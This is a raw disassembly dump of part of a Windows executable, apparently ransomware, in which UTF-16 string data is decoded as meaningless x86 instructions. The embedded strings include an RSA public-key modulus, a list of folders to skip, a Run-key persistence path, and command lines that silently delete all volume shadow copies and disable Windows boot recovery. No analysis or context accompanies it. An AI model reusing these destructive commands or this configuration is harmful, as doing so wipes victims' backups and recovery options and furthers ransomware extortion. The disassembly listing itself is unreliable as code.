  405cde:	62 00                	bound  %eax,(%eax)
  405ce0:	45                   	inc    %ebp
  405ce1:	00 50 00             	add    %dl,0x0(%eax)
  405ce4:	51                   	push   %ecx
  405ce5:	00 57 00             	add    %dl,0x0(%edi)
  405ce8:	61                   	popa
  405ce9:	00 30                	add    %dh,(%eax)
  405ceb:	00 4a 00             	add    %cl,0x0(%edx)
  405cee:	6c                   	insb   (%dx),%es:(%edi)
  405cef:	00 48 00             	add    %cl,0x0(%eax)
  405cf2:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  405cf6:	50                   	push   %eax
  405cf7:	00 34 00             	add    %dh,(%eax,%eax,1)
  405cfa:	71 00                	jno    0x405cfc
  405cfc:	63 00                	arpl   %eax,(%eax)
  405cfe:	63 00                	arpl   %eax,(%eax)
  405d00:	7a 00                	jp     0x405d02
  405d02:	6c                   	insb   (%dx),%es:(%edi)
  405d03:	00 43 00             	add    %al,0x0(%ebx)
  405d06:	58                   	pop    %eax
  405d07:	00 61 00             	add    %ah,0x0(%ecx)
  405d0a:	59                   	pop    %ecx
  405d0b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  405d0f:	00 69 00             	add    %ch,0x0(%ecx)
  405d12:	33 00                	xor    (%eax),%eax
  405d14:	33 00                	xor    (%eax),%eax
  405d16:	69 00 6c 00 69 00    	imul   $0x69006c,(%eax),%eax
  405d1c:	34 00                	xor    $0x0,%al
  405d1e:	41                   	inc    %ecx
  405d1f:	00 4d 00             	add    %cl,0x0(%ebp)
  405d22:	78 00                	js     0x405d24
  405d24:	77 00                	ja     0x405d26
  405d26:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  405d2a:	6d                   	insl   (%dx),%es:(%edi)
  405d2b:	00 36                	add    %dh,(%esi)
  405d2d:	00 68 00             	add    %ch,0x0(%eax)
  405d30:	43                   	inc    %ebx
  405d31:	00 79 00             	add    %bh,0x0(%ecx)
  405d34:	70 00                	jo     0x405d36
  405d36:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  405d3a:	67 00 2b             	add    %ch,(%bp,%di)
  405d3d:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  405d41:	00 37                	add    %dh,(%edi)
  405d43:	00 30                	add    %dh,(%eax)
  405d45:	00 78 00             	add    %bh,0x0(%eax)
  405d48:	31 00                	xor    %eax,(%eax)
  405d4a:	73 00                	jae    0x405d4c
  405d4c:	34 00                	xor    $0x0,%al
  405d4e:	76 00                	jbe    0x405d50
  405d50:	31 00                	xor    %eax,(%eax)
  405d52:	43                   	inc    %ebx
  405d53:	00 69 00             	add    %ch,0x0(%ecx)
  405d56:	6b 00 37             	imul   $0x37,(%eax),%eax
  405d59:	00 7a 00             	add    %bh,0x0(%edx)
  405d5c:	6b 00 49             	imul   $0x49,(%eax),%eax
  405d5f:	00 51 00             	add    %dl,0x0(%ecx)
  405d62:	39 00                	cmp    %eax,(%eax)
  405d64:	63 00                	arpl   %eax,(%eax)
  405d66:	68 00 33 00 70       	push   $0x70003300
  405d6b:	00 50 00             	add    %dl,0x0(%eax)
  405d6e:	61                   	popa
  405d6f:	00 5a 00             	add    %bl,0x0(%edx)
  405d72:	61                   	popa
  405d73:	00 75 00             	add    %dh,0x0(%ebp)
  405d76:	78 00                	js     0x405d78
  405d78:	6e                   	outsb  %ds:(%esi),(%dx)
  405d79:	00 53 00             	add    %dl,0x0(%ebx)
  405d7c:	54                   	push   %esp
  405d7d:	00 59 00             	add    %bl,0x0(%ecx)
  405d80:	72 00                	jb     0x405d82
  405d82:	2b 00                	sub    (%eax),%eax
  405d84:	41                   	inc    %ecx
  405d85:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  405d89:	00 58 00             	add    %bl,0x0(%eax)
  405d8c:	4b                   	dec    %ebx
  405d8d:	00 6d 00             	add    %ch,0x0(%ebp)
  405d90:	75 00                	jne    0x405d92
  405d92:	75 00                	jne    0x405d94
  405d94:	4d                   	dec    %ebp
  405d95:	00 2b                	add    %ch,(%ebx)
  405d97:	00 52 00             	add    %dl,0x0(%edx)
  405d9a:	6c                   	insb   (%dx),%es:(%edi)
  405d9b:	00 4f 00             	add    %cl,0x0(%edi)
  405d9e:	31 00                	xor    %eax,(%eax)
  405da0:	57                   	push   %edi
  405da1:	00 43 00             	add    %al,0x0(%ebx)
  405da4:	4d                   	dec    %ebp
  405da5:	00 32                	add    %dh,(%edx)
  405da7:	00 59 00             	add    %bl,0x0(%ecx)
  405daa:	47                   	inc    %edi
  405dab:	00 66 00             	add    %ah,0x0(%esi)
  405dae:	4a                   	dec    %edx
  405daf:	00 52 00             	add    %dl,0x0(%edx)
  405db2:	32 00                	xor    (%eax),%al
  405db4:	78 00                	js     0x405db6
  405db6:	4b                   	dec    %ebx
  405db7:	00 41 00             	add    %al,0x0(%ecx)
  405dba:	44                   	inc    %esp
  405dbb:	00 4e 00             	add    %cl,0x0(%esi)
  405dbe:	44                   	inc    %esp
  405dbf:	00 55 00             	add    %dl,0x0(%ebp)
  405dc2:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  405dc6:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  405dca:	35 00 64 00 51       	xor    $0x51006400,%eax
  405dcf:	00 70 00             	add    %dh,0x0(%eax)
  405dd2:	4b                   	dec    %ebx
  405dd3:	00 38                	add    %bh,(%eax)
  405dd5:	00 75 00             	add    %dh,0x0(%ebp)
  405dd8:	54                   	push   %esp
  405dd9:	00 77 00             	add    %dh,0x0(%edi)
  405ddc:	37                   	aaa
  405ddd:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  405de1:	00 73 00             	add    %dh,0x0(%ebx)
  405de4:	79 00                	jns    0x405de6
  405de6:	30 00                	xor    %al,(%eax)
  405de8:	2b 00                	sub    (%eax),%eax
  405dea:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  405dee:	66 00 38             	data16 add %bh,(%eax)
  405df1:	00 34 00             	add    %dh,(%eax,%eax,1)
  405df4:	77 00                	ja     0x405df6
  405df6:	6f                   	outsl  %ds:(%esi),(%dx)
  405df7:	00 72 00             	add    %dh,0x0(%edx)
  405dfa:	4e                   	dec    %esi
  405dfb:	00 62 00             	add    %ah,0x0(%edx)
  405dfe:	32 00                	xor    (%eax),%al
  405e00:	6b 00 31             	imul   $0x31,(%eax),%eax
  405e03:	00 6b 00             	add    %ch,0x0(%ebx)
  405e06:	70 00                	jo     0x405e08
  405e08:	59                   	pop    %ecx
  405e09:	00 6e 00             	add    %ch,0x0(%esi)
  405e0c:	46                   	inc    %esi
  405e0d:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  405e11:	00 77 00             	add    %dh,0x0(%edi)
  405e14:	68 00 55 00 78       	push   $0x78005500
  405e19:	00 53 00             	add    %dl,0x0(%ebx)
  405e1c:	31 00                	xor    %eax,(%eax)
  405e1e:	48                   	dec    %eax
  405e1f:	00 71 00             	add    %dh,0x0(%ecx)
  405e22:	55                   	push   %ebp
  405e23:	00 63 00             	add    %ah,0x0(%ebx)
  405e26:	53                   	push   %ebx
  405e27:	00 43 00             	add    %al,0x0(%ebx)
  405e2a:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  405e2e:	61                   	popa
  405e2f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405e33:	00 38                	add    %bh,(%eax)
  405e35:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  405e39:	00 34 00             	add    %dh,(%eax,%eax,1)
  405e3c:	63 00                	arpl   %eax,(%eax)
  405e3e:	5a                   	pop    %edx
  405e3f:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  405e43:	00 75 00             	add    %dh,0x0(%ebp)
  405e46:	72 00                	jb     0x405e48
  405e48:	75 00                	jne    0x405e4a
  405e4a:	6f                   	outsl  %ds:(%esi),(%dx)
  405e4b:	00 4d 00             	add    %cl,0x0(%ebp)
  405e4e:	46                   	inc    %esi
  405e4f:	00 6b 00             	add    %ch,0x0(%ebx)
  405e52:	54                   	push   %esp
  405e53:	00 6d 00             	add    %ch,0x0(%ebp)
  405e56:	78 00                	js     0x405e58
  405e58:	4b                   	dec    %ebx
  405e59:	00 59 00             	add    %bl,0x0(%ecx)
  405e5c:	47                   	inc    %edi
  405e5d:	00 35 00 2b 00 41    	add    %dh,0x41002b00
  405e63:	00 6a 00             	add    %ch,0x0(%edx)
  405e66:	41                   	inc    %ecx
  405e67:	00 4e 00             	add    %cl,0x0(%esi)
  405e6a:	48                   	dec    %eax
  405e6b:	00 36                	add    %dh,(%esi)
  405e6d:	00 39                	add    %bh,(%ecx)
  405e6f:	00 65 00             	add    %ah,0x0(%ebp)
  405e72:	43                   	inc    %ebx
  405e73:	00 65 00             	add    %ah,0x0(%ebp)
  405e76:	49                   	dec    %ecx
  405e77:	00 51 00             	add    %dl,0x0(%ecx)
  405e7a:	3d 00 3d 00 3c       	cmp    $0x3c003d00,%eax
  405e7f:	00 2f                	add    %ch,(%edi)
  405e81:	00 4d 00             	add    %cl,0x0(%ebp)
  405e84:	6f                   	outsl  %ds:(%esi),(%dx)
  405e85:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  405e89:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  405e8d:	00 73 00             	add    %dh,0x0(%ebx)
  405e90:	3e 00 00             	add    %al,%ds:(%eax)
  405e93:	21 3c 00             	and    %edi,(%eax,%eax,1)
  405e96:	2f                   	das
  405e97:	00 52 00             	add    %dl,0x0(%edx)
  405e9a:	53                   	push   %ebx
  405e9b:	00 41 00             	add    %al,0x0(%ecx)
  405e9e:	50                   	push   %eax
  405e9f:	00 61 00             	add    %ah,0x0(%ecx)
  405ea2:	72 00                	jb     0x405ea4
  405ea4:	61                   	popa
  405ea5:	00 6d 00             	add    %ch,0x0(%ebp)
  405ea8:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  405ead:	00 72 00             	add    %dh,0x0(%edx)
  405eb0:	73 00                	jae    0x405eb2
  405eb2:	3e 00 00             	add    %al,%ds:(%eax)
  405eb5:	80 8b 61 00 62 00 63 	orb    $0x63,0x620061(%ebx)
  405ebc:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405ec0:	00 66 00             	add    %ah,0x0(%esi)
  405ec3:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  405ec7:	69 00 6a 00 6b 00    	imul   $0x6b006a,(%eax),%eax
  405ecd:	6c                   	insb   (%dx),%es:(%edi)
  405ece:	00 6d 00             	add    %ch,0x0(%ebp)
  405ed1:	6e                   	outsb  %ds:(%esi),(%dx)
  405ed2:	00 6f 00             	add    %ch,0x0(%edi)
  405ed5:	70 00                	jo     0x405ed7
  405ed7:	71 00                	jno    0x405ed9
  405ed9:	72 00                	jb     0x405edb
  405edb:	73 00                	jae    0x405edd
  405edd:	74 00                	je     0x405edf
  405edf:	75 00                	jne    0x405ee1
  405ee1:	76 00                	jbe    0x405ee3
  405ee3:	77 00                	ja     0x405ee5
  405ee5:	78 00                	js     0x405ee7
  405ee7:	79 00                	jns    0x405ee9
  405ee9:	7a 00                	jp     0x405eeb
  405eeb:	41                   	inc    %ecx
  405eec:	00 42 00             	add    %al,0x0(%edx)
  405eef:	43                   	inc    %ebx
  405ef0:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  405ef4:	00 46 00             	add    %al,0x0(%esi)
  405ef7:	47                   	inc    %edi
  405ef8:	00 48 00             	add    %cl,0x0(%eax)
  405efb:	49                   	dec    %ecx
  405efc:	00 4a 00             	add    %cl,0x0(%edx)
  405eff:	4b                   	dec    %ebx
  405f00:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  405f04:	00 4e 00             	add    %cl,0x0(%esi)
  405f07:	4f                   	dec    %edi
  405f08:	00 50 00             	add    %dl,0x0(%eax)
  405f0b:	51                   	push   %ecx
  405f0c:	00 52 00             	add    %dl,0x0(%edx)
  405f0f:	53                   	push   %ebx
  405f10:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  405f14:	00 56 00             	add    %dl,0x0(%esi)
  405f17:	57                   	push   %edi
  405f18:	00 58 00             	add    %bl,0x0(%eax)
  405f1b:	59                   	pop    %ecx
  405f1c:	00 5a 00             	add    %bl,0x0(%edx)
  405f1f:	31 00                	xor    %eax,(%eax)
  405f21:	32 00                	xor    (%eax),%al
  405f23:	33 00                	xor    (%eax),%eax
  405f25:	34 00                	xor    $0x0,%al
  405f27:	35 00 36 00 37       	xor    $0x37003600,%eax
  405f2c:	00 38                	add    %bh,(%eax)
  405f2e:	00 39                	add    %bh,(%ecx)
  405f30:	00 30                	add    %dh,(%eax)
  405f32:	00 2a                	add    %ch,(%edx)
  405f34:	00 21                	add    %ah,(%ecx)
  405f36:	00 3d 00 26 00 3f    	add    %bh,0x3f002600
  405f3c:	00 26                	add    %ah,(%esi)
  405f3e:	00 2f                	add    %ch,(%edi)
  405f40:	00 00                	add    %al,(%eax)
  405f42:	03 2e                	add    (%esi),%ebp
  405f44:	00 00                	add    %al,(%eax)
  405f46:	03 3f                	add    (%edi),%edi
  405f48:	00 00                	add    %al,(%eax)
  405f4a:	07                   	pop    %es
  405f4b:	43                   	inc    %ebx
  405f4c:	00 3a                	add    %bh,(%edx)
  405f4e:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  405f52:	1b 50 00             	sbb    0x0(%eax),%edx
  405f55:	72 00                	jb     0x405f57
  405f57:	6f                   	outsl  %ds:(%esi),(%dx)
  405f58:	00 67 00             	add    %ah,0x0(%edi)
  405f5b:	72 00                	jb     0x405f5d
  405f5d:	61                   	popa
  405f5e:	00 6d 00             	add    %ch,0x0(%ebp)
  405f61:	20 00                	and    %al,(%eax)
  405f63:	46                   	inc    %esi
  405f64:	00 69 00             	add    %ch,0x0(%ecx)
  405f67:	6c                   	insb   (%dx),%es:(%edi)
  405f68:	00 65 00             	add    %ah,0x0(%ebp)
  405f6b:	73 00                	jae    0x405f6d
  405f6d:	00 27                	add    %ah,(%edi)
  405f6f:	50                   	push   %eax
  405f70:	00 72 00             	add    %dh,0x0(%edx)
  405f73:	6f                   	outsl  %ds:(%esi),(%dx)
  405f74:	00 67 00             	add    %ah,0x0(%edi)
  405f77:	72 00                	jb     0x405f79
  405f79:	61                   	popa
  405f7a:	00 6d 00             	add    %ch,0x0(%ebp)
  405f7d:	20 00                	and    %al,(%eax)
  405f7f:	46                   	inc    %esi
  405f80:	00 69 00             	add    %ch,0x0(%ecx)
  405f83:	6c                   	insb   (%dx),%es:(%edi)
  405f84:	00 65 00             	add    %ah,0x0(%ebp)
  405f87:	73 00                	jae    0x405f89
  405f89:	20 00                	and    %al,(%eax)
  405f8b:	28 00                	sub    %al,(%eax)
  405f8d:	78 00                	js     0x405f8f
  405f8f:	38 00                	cmp    %al,(%eax)
  405f91:	36 00 29             	add    %ch,%ss:(%ecx)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	0f 57 00             	xorps  (%eax),%xmm0
  405f99:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405f9f:	6f                   	outsl  %ds:(%esi),(%dx)
  405fa0:	00 77 00             	add    %dh,0x0(%edi)
  405fa3:	73 00                	jae    0x405fa5
  405fa5:	00 0b                	add    %cl,(%ebx)
  405fa7:	49                   	dec    %ecx
  405fa8:	00 6e 00             	add    %ch,0x0(%esi)
  405fab:	74 00                	je     0x405fad
  405fad:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  405fb2:	11 50 00             	adc    %edx,0x0(%eax)
  405fb5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405fb9:	66 00 4c 00 6f       	data16 add %cl,0x6f(%eax,%eax,1)
  405fbe:	00 67 00             	add    %ah,0x0(%edi)
  405fc1:	73 00                	jae    0x405fc3
  405fc3:	00 17                	add    %dl,(%edi)
  405fc5:	57                   	push   %edi
  405fc6:	00 69 00             	add    %ch,0x0(%ecx)
  405fc9:	6e                   	outsb  %ds:(%esi),(%dx)
  405fca:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  405fce:	00 77 00             	add    %dh,0x0(%edi)
  405fd1:	73 00                	jae    0x405fd3
  405fd3:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  405fd7:	6c                   	insb   (%dx),%es:(%edi)
  405fd8:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  405fdc:	07                   	pop    %es
  405fdd:	41                   	inc    %ecx
  405fde:	00 4d 00             	add    %cl,0x0(%ebp)
  405fe1:	44                   	inc    %esp
  405fe2:	00 00                	add    %al,(%eax)
  405fe4:	0d 4e 00 56 00       	or     $0x56004e,%eax
  405fe9:	49                   	dec    %ecx
  405fea:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  405fee:	00 41 00             	add    %al,0x0(%ecx)
  405ff1:	00 17                	add    %dl,(%edi)
  405ff3:	50                   	push   %eax
  405ff4:	00 72 00             	add    %dh,0x0(%edx)
  405ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  405ff8:	00 67 00             	add    %ah,0x0(%edi)
  405ffb:	72 00                	jb     0x405ffd
  405ffd:	61                   	popa
  405ffe:	00 6d 00             	add    %ch,0x0(%ebp)
  406001:	44                   	inc    %esp
  406002:	00 61 00             	add    %ah,0x0(%ecx)
  406005:	74 00                	je     0x406007
  406007:	61                   	popa
  406008:	00 00                	add    %al,(%eax)
  40600a:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  40600e:	0b 72 00             	or     0x0(%edx),%esi
  406011:	75 00                	jne    0x406013
  406013:	6e                   	outsb  %ds:(%esi),(%dx)
  406014:	00 61 00             	add    %ah,0x0(%ecx)
  406017:	73 00                	jae    0x406019
  406019:	00 09                	add    %cl,(%ecx)
  40601b:	2e 00 75 00          	add    %dh,%cs:0x0(%ebp)
  40601f:	72 00                	jb     0x406021
  406021:	6c                   	insb   (%dx),%es:(%edi)
  406022:	00 00                	add    %al,(%eax)
  406024:	25 5b 00 49 00       	and    $0x49005b,%eax
  406029:	6e                   	outsb  %ds:(%esi),(%dx)
  40602a:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40602e:	00 72 00             	add    %dh,0x0(%edx)
  406031:	6e                   	outsb  %ds:(%esi),(%dx)
  406032:	00 65 00             	add    %ah,0x0(%ebp)
  406035:	74 00                	je     0x406037
  406037:	53                   	push   %ebx
  406038:	00 68 00             	add    %ch,0x0(%eax)
  40603b:	6f                   	outsl  %ds:(%esi),(%dx)
  40603c:	00 72 00             	add    %dh,0x0(%edx)
  40603f:	74 00                	je     0x406041
  406041:	63 00                	arpl   %eax,(%eax)
  406043:	75 00                	jne    0x406045
  406045:	74 00                	je     0x406047
  406047:	5d                   	pop    %ebp
  406048:	00 00                	add    %al,(%eax)
  40604a:	19 55 00             	sbb    %edx,0x0(%ebp)
  40604d:	52                   	push   %edx
  40604e:	00 4c 00 3d          	add    %cl,0x3d(%eax,%eax,1)
  406052:	00 66 00             	add    %ah,0x0(%esi)
  406055:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40605b:	3a 00                	cmp    (%eax),%al
  40605d:	2f                   	das
  40605e:	00 2f                	add    %ch,(%edi)
  406060:	00 2f                	add    %ch,(%edi)
  406062:	00 00                	add    %al,(%eax)
  406064:	17                   	pop    %ss
  406065:	49                   	dec    %ecx
  406066:	00 63 00             	add    %ah,0x0(%ebx)
  406069:	6f                   	outsl  %ds:(%esi),(%dx)
  40606a:	00 6e 00             	add    %ch,0x0(%esi)
  40606d:	49                   	dec    %ecx
  40606e:	00 6e 00             	add    %ch,0x0(%esi)
  406071:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406075:	78 00                	js     0x406077
  406077:	3d 00 30 00 00       	cmp    $0x3000,%eax
  40607c:	13 49 00             	adc    0x0(%ecx),%ecx
  40607f:	63 00                	arpl   %eax,(%eax)
  406081:	6f                   	outsl  %ds:(%esi),(%dx)
  406082:	00 6e 00             	add    %ch,0x0(%esi)
  406085:	46                   	inc    %esi
  406086:	00 69 00             	add    %ch,0x0(%ecx)
  406089:	6c                   	insb   (%dx),%es:(%edi)
  40608a:	00 65 00             	add    %ah,0x0(%ebp)
  40608d:	3d 00 00 5b 53       	cmp    $0x535b0000,%eax
  406092:	00 4f 00             	add    %cl,0x0(%edi)
  406095:	46                   	inc    %esi
  406096:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40609a:	00 41 00             	add    %al,0x0(%ecx)
  40609d:	52                   	push   %edx
  40609e:	00 45 00             	add    %al,0x0(%ebp)
  4060a1:	5c                   	pop    %esp
  4060a2:	00 4d 00             	add    %cl,0x0(%ebp)
  4060a5:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4060ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ac:	00 73 00             	add    %dh,0x0(%ebx)
  4060af:	6f                   	outsl  %ds:(%esi),(%dx)
  4060b0:	00 66 00             	add    %ah,0x0(%esi)
  4060b3:	74 00                	je     0x4060b5
  4060b5:	5c                   	pop    %esp
  4060b6:	00 57 00             	add    %dl,0x0(%edi)
  4060b9:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4060bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4060c0:	00 77 00             	add    %dh,0x0(%edi)
  4060c3:	73 00                	jae    0x4060c5
  4060c5:	5c                   	pop    %esp
  4060c6:	00 43 00             	add    %al,0x0(%ebx)
  4060c9:	75 00                	jne    0x4060cb
  4060cb:	72 00                	jb     0x4060cd
  4060cd:	72 00                	jb     0x4060cf
  4060cf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4060d3:	74 00                	je     0x4060d5
  4060d5:	56                   	push   %esi
  4060d6:	00 65 00             	add    %ah,0x0(%ebp)
  4060d9:	72 00                	jb     0x4060db
  4060db:	73 00                	jae    0x4060dd
  4060dd:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4060e3:	5c                   	pop    %esp
  4060e4:	00 52 00             	add    %dl,0x0(%edx)
  4060e7:	75 00                	jne    0x4060e9
  4060e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4060ea:	00 00                	add    %al,(%eax)
  4060ec:	1f                   	pop    %ds
  4060ed:	4d                   	dec    %ebp
  4060ee:	00 69 00             	add    %ch,0x0(%ecx)
  4060f1:	63 00                	arpl   %eax,(%eax)
  4060f3:	72 00                	jb     0x4060f5
  4060f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4060f6:	00 73 00             	add    %dh,0x0(%ebx)
  4060f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4060fa:	00 66 00             	add    %ah,0x0(%esi)
  4060fd:	74 00                	je     0x4060ff
  4060ff:	20 00                	and    %al,(%eax)
  406101:	53                   	push   %ebx
  406102:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  406106:	00 72 00             	add    %dh,0x0(%edx)
  406109:	65 00 00             	add    %al,%gs:(%eax)
  40610c:	0f 63 00             	packsswb (%eax),%mm0
  40610f:	6d                   	insl   (%dx),%es:(%edi)
  406110:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  406114:	00 65 00             	add    %ah,0x0(%ebp)
  406117:	78 00                	js     0x406119
  406119:	65 00 00             	add    %al,%gs:(%eax)
  40611c:	07                   	pop    %es
  40611d:	2f                   	das
  40611e:	00 43 00             	add    %al,0x0(%ebx)
  406121:	20 00                	and    %al,(%eax)
  406123:	00 79 76             	add    %bh,0x76(%ecx)
  406126:	00 73 00             	add    %dh,0x0(%ebx)
  406129:	73 00                	jae    0x40612b
  40612b:	61                   	popa
  40612c:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  406130:	00 69 00             	add    %ch,0x0(%ecx)
  406133:	6e                   	outsb  %ds:(%esi),(%dx)
  406134:	00 20                	add    %ah,(%eax)
  406136:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40613a:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40613e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  406142:	00 20                	add    %ah,(%eax)
  406144:	00 73 00             	add    %dh,0x0(%ebx)
  406147:	68 00 61 00 64       	push   $0x64006100
  40614c:	00 6f 00             	add    %ch,0x0(%edi)
  40614f:	77 00                	ja     0x406151
  406151:	73 00                	jae    0x406153
  406153:	20 00                	and    %al,(%eax)
  406155:	2f                   	das
  406156:	00 61 00             	add    %ah,0x0(%ecx)
  406159:	6c                   	insb   (%dx),%es:(%edi)
  40615a:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40615e:	00 2f                	add    %ch,(%edi)
  406160:	00 71 00             	add    %dh,0x0(%ecx)
  406163:	75 00                	jne    0x406165
  406165:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  40616b:	20 00                	and    %al,(%eax)
  40616d:	26 00 20             	add    %ah,%es:(%eax)
  406170:	00 77 00             	add    %dh,0x0(%edi)
  406173:	6d                   	insl   (%dx),%es:(%edi)
  406174:	00 69 00             	add    %ch,0x0(%ecx)
  406177:	63 00                	arpl   %eax,(%eax)
  406179:	20 00                	and    %al,(%eax)
  40617b:	73 00                	jae    0x40617d
  40617d:	68 00 61 00 64       	push   $0x64006100
  406182:	00 6f 00             	add    %ch,0x0(%edi)
  406185:	77 00                	ja     0x406187
  406187:	63 00                	arpl   %eax,(%eax)
  406189:	6f                   	outsl  %ds:(%esi),(%dx)
  40618a:	00 70 00             	add    %dh,0x0(%eax)
  40618d:	79 00                	jns    0x40618f
  40618f:	20 00                	and    %al,(%eax)
  406191:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406195:	6c                   	insb   (%dx),%es:(%edi)
  406196:	00 65 00             	add    %ah,0x0(%ebp)
  406199:	74 00                	je     0x40619b
  40619b:	65 00 00             	add    %al,%gs:(%eax)
  40619e:	80 cb 62             	or     $0x62,%bl
  4061a1:	00 63 00             	add    %ah,0x0(%ebx)
  4061a4:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4061a8:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4061ac:	74 00                	je     0x4061ae
  4061ae:	20 00                	and    %al,(%eax)
  4061b0:	2f                   	das
  4061b1:	00 73 00             	add    %dh,0x0(%ebx)
  4061b4:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  4061b9:	00 7b 00             	add    %bh,0x0(%ebx)
  4061bc:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4061c0:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4061c4:	75 00                	jne    0x4061c6
  4061c6:	6c                   	insb   (%dx),%es:(%edi)
  4061c7:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  4061cb:	00 20                	add    %ah,(%eax)
  4061cd:	00 62 00             	add    %ah,0x0(%edx)
  4061d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d1:	00 6f 00             	add    %ch,0x0(%edi)
  4061d4:	74 00                	je     0x4061d6
  4061d6:	73 00                	jae    0x4061d8
  4061d8:	74 00                	je     0x4061da
  4061da:	61                   	popa
  4061db:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  4061df:	00 73 00             	add    %dh,0x0(%ebx)
  4061e2:	70 00                	jo     0x4061e4
  4061e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4061e5:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4061e9:	00 63 00             	add    %ah,0x0(%ebx)
  4061ec:	79 00                	jns    0x4061ee
  4061ee:	20 00                	and    %al,(%eax)
  4061f0:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  4061f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4061f7:	00 72 00             	add    %dh,0x0(%edx)
  4061fa:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4061fe:	6c                   	insb   (%dx),%es:(%edi)
  4061ff:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  406203:	00 61 00             	add    %ah,0x0(%ecx)
  406206:	69 00 6c 00 75 00    	imul   $0x75006c,(%eax),%eax
  40620c:	72 00                	jb     0x40620e
  40620e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406212:	20 00                	and    %al,(%eax)
  406214:	26 00 20             	add    %ah,%es:(%eax)
  406217:	00 62 00             	add    %ah,0x0(%edx)
  40621a:	63 00                	arpl   %eax,(%eax)
  40621c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406220:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  406224:	74 00                	je     0x406226
  406226:	20 00                	and    %al,(%eax)
  406228:	2f                   	das
  406229:	00 73 00             	add    %dh,0x0(%ebx)
  40622c:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  406231:	00 7b 00             	add    %bh,0x0(%ebx)
  406234:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  406238:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40623c:	75 00                	jne    0x40623e
  40623e:	6c                   	insb   (%dx),%es:(%edi)
  40623f:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  406243:	00 20                	add    %ah,(%eax)
  406245:	00 72 00             	add    %dh,0x0(%edx)
  406248:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40624c:	6f                   	outsl  %ds:(%esi),(%dx)
  40624d:	00 76 00             	add    %dh,0x0(%esi)
  406250:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  406254:	79 00                	jns    0x406256
  406256:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40625a:	61                   	popa
